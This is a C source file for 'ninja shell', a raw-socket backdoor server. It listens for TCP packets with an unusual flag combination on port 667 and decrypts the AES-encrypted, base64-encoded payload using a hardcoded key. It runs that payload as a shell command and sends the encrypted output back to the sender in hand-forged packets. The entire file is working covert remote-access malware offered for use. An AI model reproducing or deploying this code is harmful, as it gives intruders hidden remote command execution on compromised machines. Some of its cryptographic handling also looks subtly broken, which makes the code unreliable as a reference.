/*
Author:Antonio Costa aka " Cooler_ "
contact: c00f3r[at]gmail[dot]com

    Copyright (C) 2013 ninja shell authors,
    
    This file is part of ninja shell
    
    ninja shell is free software: you can redistribute it and/or modify
    it under the terms of the GNU Lesser General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    ninja shell is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU Lesser General Public License for more details.

    You should have received a copy of the GNU Lesser General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.

Thanks: Iak(Tiago Natel),m0nad(Victor Ramos)

What is this ?
just another raw socket shell server
 

*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <sys/socket.h>
#include <alloca.h>
#include <openssl/pem.h>
#include <string.h> 
#define PORT  667
#define MAX    9192
#define ERRO   -1
#include <openssl/evp.h>
#include <openssl/aes.h>

char *encode64 (const void *b64_encode_this, int encode_this_many_bytes);
char *decode64 (const void *b64_decode_this, int decode_this_many_bytes);
int aes_init(unsigned char *key_data, int key_data_len, unsigned char *salt, EVP_CIPHER_CTX *e_ctx, EVP_CIPHER_CTX *d_ctx);
unsigned char *aes_decrypt(EVP_CIPHER_CTX *e, unsigned char *ciphertext, int *len);
unsigned char *aes_encrypt(EVP_CIPHER_CTX *e, unsigned char *plaintext, int *len);
void fazerpacote(char * dest_addr, unsigned short dest_port,char *payload); 
unsigned short in_cksum(unsigned short *, int);   
void chomp(char * str);

int main(void)
{
	FILE *fpipe;
 	int  sockfd=0,counter=0,cmd=1;
 	char buffer[MAX],line[MAX];
 	char ip_tmp[INET_ADDRSTRLEN];
 	struct iphdr *iphr;
 	struct tcphdr *tcphr;

 	bzero(buffer,MAX);
 	iphr = (struct iphdr *) buffer;
 	tcphr = (struct tcphdr *) (buffer + sizeof(struct iphdr));

 	if((sockfd = socket(PF_INET, SOCK_RAW, IPPROTO_TCP)) == ERRO)
  		exit(ERRO);

 	while(read(sockfd, buffer, sizeof (buffer)-1)) 
 	{
  		if((ntohs(tcphr->dest)==PORT)&&(tcphr->fin == 1)&&(tcphr->psh == 1) && (tcphr->urg == 1) && (tcphr->window == htons(10666))) 
  		{
   			if(!(cmd&1))
   			{
    				cmd=1; 
    
   			} else {
    
    				EVP_CIPHER_CTX en, de;

    				unsigned int salt[] = {13371, 17331};
    				unsigned char *key_data=NULL;
    				int key_data_len=0;

    				key_data = (unsigned char *)"Coolerudos key";
    				key_data_len = strlen("Coolerudos key");
  
    				if(aes_init(key_data, key_data_len, (unsigned char *)&salt, &en, &de)) 
    				{
      					fprintf(stdout,"Error init AES cipher\n");
      					return -1;
    				}
 
    				char *plaintext=NULL;

    				counter=sizeof(struct tcphdr) + sizeof(struct iphdr);

    				inet_ntop(AF_INET,&(iphr->saddr),ip_tmp,INET_ADDRSTRLEN);

    				char *tmp=malloc(strlen(buffer)+counter+556);
    				sprintf(tmp,"%s",buffer+counter);
    				char *decode_64=decode64(tmp,strlen(tmp)+1);
    				free(tmp);
    				int lencode=strlen(decode_64)+1;
    				plaintext=(char *)aes_decrypt(&de, (unsigned char *)decode_64,&lencode);
//debug printf("\n 2 buffer:  %s     decode: %s\n",tmp,plaintext);

    				chomp(plaintext);
    				char *cmd=malloc(strlen(plaintext)+1*sizeof(char));
    				sprintf(cmd,"%s",plaintext);

    				if ( !(fpipe = (FILE *)popen (cmd,"r")) ) 
    				{
     					puts("error on pipe");
     					exit(1);
    				}

    				while (fgets (line, sizeof line, fpipe)) 
    				{

     					unsigned char *tmp2=NULL;
     					int len4=strlen(line)+1;
     					tmp2=aes_encrypt(&en, (unsigned char *)line, &len4);
     					char *encode_64=encode64(tmp2,strlen((char *)tmp2)+1);
// debug	printf("debug 2 %s encode %s\n",line,encode_64);
					free(tmp2);
     					fazerpacote(ip_tmp,PORT,encode_64);
     					bzero(line,MAX);
     					free(encode_64);
    				}

    				pclose(fpipe);
    				free(plaintext);
    				free(decode_64);
    				free(cmd);
    				cmd++;
   			}

  		}

  		bzero(buffer,MAX);
 	}

 exit(1);
}



     
void fazerpacote(char *dest_addr, unsigned short dest_port, char * payload)
{    

 char packet[sizeof (struct iphdr) + sizeof (struct tcphdr) + MAX];
 struct envio {    
  struct iphdr *ip;    
  struct tcphdr *tcp;
 } envio;    

 struct pseudo_header {    
  unsigned int source_address;    
  unsigned int dest_address;    
  unsigned char placeholder;    
  unsigned char protocol;    
  unsigned short tcp_length;    
  char* data;
 };
     
 int tcp_socket;   
 struct sockaddr_in sin; 
 unsigned int destino;
 
 	envio.ip = (struct iphdr*) packet;
 	envio.tcp = (struct tcphdr*) (packet + sizeof (struct iphdr));
 	struct pseudo_header pseudo_header; 
 	char* data = packet +  sizeof(struct iphdr) + sizeof(struct tcphdr);
 
 	const char* message = payload;
 	strncpy(data, message, strlen(message));
 
 	inet_pton(PF_INET, dest_addr, &destino);
 
 	bzero(packet, sizeof(struct iphdr)); 
         
//setamos variaveis do pacote ip   
 	envio.ip->ihl = 5;    
 	envio.ip->version = 4;    
 	envio.ip->tos = 0;    
 	envio.ip->tot_len = htons(sizeof(struct iphdr) + MAX);  
 	envio.ip->id = dest_port;    
 	envio.ip->frag_off = 0;    
 	envio.ip->ttl = 255;    
 	envio.ip->protocol = IPPROTO_TCP;    
 	envio.ip->check = 0;    
// envio.ip->saddr = remetente;    
 	envio.ip->daddr = destino;    
        
//setamos variaveis do pacote TCP    
 	envio.tcp->source = dest_port;    
 	envio.tcp->dest = htons(dest_port);    
 	envio.tcp->seq = dest_port;          
 	envio.tcp->res1 = 0;
 	envio.tcp->res2 = 0;     
 	envio.tcp->doff = 5;    
 	envio.tcp->ack = 0; 
 	envio.tcp->ack_seq = 0;    
 	envio.tcp->urg_ptr = 0;        
 	envio.tcp->window = htons(10666);    
 	envio.tcp->check = 0;   
//flags 
 	envio.tcp->fin = 1;    
 	envio.tcp->syn = 0;    
 	envio.tcp->rst = 0;    
 	envio.tcp->psh = 1;  
 	envio.tcp->urg = 1;  
 	envio.tcp->ack = 0; 
                
 	sin.sin_family = AF_INET;    
 	sin.sin_port = envio.tcp->source;    
 	sin.sin_addr.s_addr = envio.ip->daddr;       
        
// abrimos a socket   
  	tcp_socket = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);    

  	if(tcp_socket < 0) 
  	{    
   		perror("socket");    
   		exit(1);    
  	}    
        
// setamos os campos que precisão ser mudados   
  	envio.tcp->source++;    
  	envio.ip->id++;    
  	envio.tcp->seq++;    
  	envio.tcp->check = 0;    
  	envio.ip->check = 0;    
       
// checksum   
  	envio.ip->check = in_cksum((unsigned short *)&envio.ip, sizeof (struct iphdr)); 
     
// setamos campo dos cabeçalhos     
  	pseudo_header.source_address = envio.ip->saddr;    
  	pseudo_header.dest_address = envio.ip->daddr;    
  
  	pseudo_header.protocol = IPPROTO_TCP;    
  	pseudo_header.tcp_length = htons(sizeof(struct tcphdr) + MAX);
  	pseudo_header.data = data;

  	envio.tcp->check = in_cksum((unsigned short *)&pseudo_header, sizeof(struct tcphdr) + sizeof(struct pseudo_header) + MAX); //32    

 // Voce precisa setar HDRINCL no seu socket para o kernel aceitar a sua definicao do iphdr
  	int one = 1;
  	const int *val = &one;

  	if (setsockopt (tcp_socket, IPPROTO_IP, IP_HDRINCL, val, sizeof (one)) < 0)
    		printf ("Warning: Cannot set HDRINCL!\n");

  	if (sendto(tcp_socket, packet, ntohs(envio.ip->tot_len), 0, (struct sockaddr *)&sin, sizeof(struct sockaddr_in)) < 0) 
  	{
    		fprintf(stderr, "sendto error...\n");
    		perror("ops");
    		close(tcp_socket);    
    		exit(1);
  	} 
    
	close(tcp_socket);    
}    
     
//calculo feito afim de checar a integridade 
unsigned short in_cksum(unsigned short *ptr, int nbytes) 
{    
 	register u_short    answer;     // u_short == 16 bits   
 	register long       sum;        // long == 32 bits    
 	u_short         oddbyte;     
     
 	sum = 0;
   
 	while(nbytes > 1)  
 	{    
  		sum += *ptr++;   
  		nbytes -= 2;    
 	}    
                        
 	if(!(nbytes^1)) 
 	{    
  		oddbyte = 0;       
  		*((u_char *) &oddbyte) = *(u_char *)ptr;      
  		sum += oddbyte;    
 	}    
     
 	sum = (sum >> 16) + (sum & 0xffff);  // addicina auto-16 para baixo-16     
 	sum += (sum >> 16);           
 	answer = ~sum;  
       
 	return(answer);    
}    



char *encode64 (const void *b64_encode_this, int encode_this_many_bytes)
{
    	BIO *b64_bio, *mem_bio;     
    	BUF_MEM *mem_bio_mem_ptr;  
  
    	b64_bio = BIO_new(BIO_f_base64());       
    	mem_bio = BIO_new(BIO_s_mem());                         
    	BIO_push(b64_bio, mem_bio);           
    	BIO_set_flags(b64_bio, BIO_FLAGS_BASE64_NO_NL);  
    	BIO_write(b64_bio, b64_encode_this, encode_this_many_bytes); 
    	BIO_flush(b64_bio);   
    	BIO_get_mem_ptr(mem_bio, &mem_bio_mem_ptr);  
    	BIO_set_close(mem_bio, BIO_NOCLOSE);   
    	BIO_free_all(b64_bio); 
    	BUF_MEM_grow(mem_bio_mem_ptr, (*mem_bio_mem_ptr).length + 1);   
    	(*mem_bio_mem_ptr).data[(*mem_bio_mem_ptr).length] = '\0';  

    	return (*mem_bio_mem_ptr).data; 
}

char *decode64 (const void *b64_decode_this, int decode_this_many_bytes)
{
    	BIO *b64_bio, *mem_bio;     
    	char *base64_decoded = calloc( (decode_this_many_bytes*3)/4+1, sizeof(char) ); 

    	b64_bio = BIO_new(BIO_f_base64());                     
    	mem_bio = BIO_new(BIO_s_mem());                        
    	BIO_write(mem_bio, b64_decode_this, decode_this_many_bytes); 
    	BIO_push(b64_bio, mem_bio);          
    	BIO_set_flags(b64_bio, BIO_FLAGS_BASE64_NO_NL);        
    	int decoded_byte_index = 0;   

    	while ( 0 < BIO_read(b64_bio, base64_decoded+decoded_byte_index, 1) ){ 
        	decoded_byte_index++; 
    	} 

    	BIO_free_all(b64_bio);  

    	return base64_decoded;       
}

int 
aes_init(unsigned char *key_data, int key_data_len, unsigned char *salt, EVP_CIPHER_CTX *e_ctx, EVP_CIPHER_CTX *d_ctx)
{
  	int x=0, nrounds = 5;
  	unsigned char key[32], iv[32];
  
  	x = EVP_BytesToKey(EVP_aes_128_xts(), EVP_sha1(), salt, key_data, key_data_len, nrounds, key, iv);

  	if(x != 32) 
  	{
    		fprintf(stdout,"Key size %d bits - should be 256 bits\n", x);
    		return -1;
  	}

  	EVP_CIPHER_CTX_init(e_ctx);
  	EVP_EncryptInit_ex(e_ctx, EVP_aes_128_xts(), NULL, key, iv);
  	EVP_CIPHER_CTX_init(d_ctx);
  	EVP_DecryptInit_ex(d_ctx, EVP_aes_128_xts(), NULL, key, iv);

  	return 0;
}

unsigned char 
*aes_encrypt(EVP_CIPHER_CTX *e, unsigned char *plaintext, int *len)
{
  	int c_len = *len + AES_BLOCK_SIZE, f_len = 0;
  	unsigned char *ciphertext = malloc(c_len);

  	EVP_EncryptInit_ex(e, NULL, NULL, NULL, NULL);
  	EVP_EncryptUpdate(e, ciphertext, &c_len, plaintext, *len);
  	EVP_EncryptFinal_ex(e, ciphertext+c_len, &f_len);

  	*len = c_len + f_len;

  	return ciphertext;
}

unsigned char 
*aes_decrypt(EVP_CIPHER_CTX *e, unsigned char *ciphertext, int *len)
{
  	int p_len = *len, f_len = 0;
  	unsigned char *plaintext = malloc(p_len + AES_BLOCK_SIZE);
  
  	EVP_DecryptInit_ex(e, NULL, NULL, NULL, NULL);
  	EVP_DecryptUpdate(e, plaintext, &p_len, ciphertext, *len);
  	EVP_DecryptFinal_ex(e, plaintext+p_len, &f_len);

  	*len = p_len + f_len;

  	return plaintext;
}


void chomp(char * str)
{
  	while(*str) 
  	{
    		if(*str == '\n' || *str == '\r') 
    		{
     			*str = 0;
     			return;
    		}
    		str++;
  	}
} 
